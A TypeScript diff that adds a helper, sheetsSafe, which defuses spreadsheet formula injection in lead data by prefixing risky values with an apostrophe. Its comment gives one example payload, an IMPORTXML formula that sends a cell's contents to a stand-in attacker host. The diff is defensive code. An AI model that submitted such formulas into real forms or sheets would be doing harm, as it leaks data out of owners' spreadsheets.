@@ -33,3 +33,14 @@ export function genDiscountCode(discountPct: number): string {
 export function escapeLike(s: string): string {
   return s.replace(/[\\%_]/g, "\\$&");
 }
+
+/**
+ * A value that is safe to write into a spreadsheet cell. Google Sheets / Excel evaluate a cell that
+ * starts with = + - @ as a FORMULA — and the lead's name and e-mail come from a public (anon-key)
+ * client, so `=IMPORTXML("http://evil/?"&A2,"//a")` as a first name would run inside the owner's CRM
+ * sheet. A leading apostrophe stores the text as text.
+ */
+export function sheetsSafe(value: unknown, max = 500): string {
+  const text = String(value ?? "").replace(/[\r\n]+/g, " ").trim().slice(0, max);
+  return /^[=+\-@]/.test(text) ? `'${text}` : text;
+}
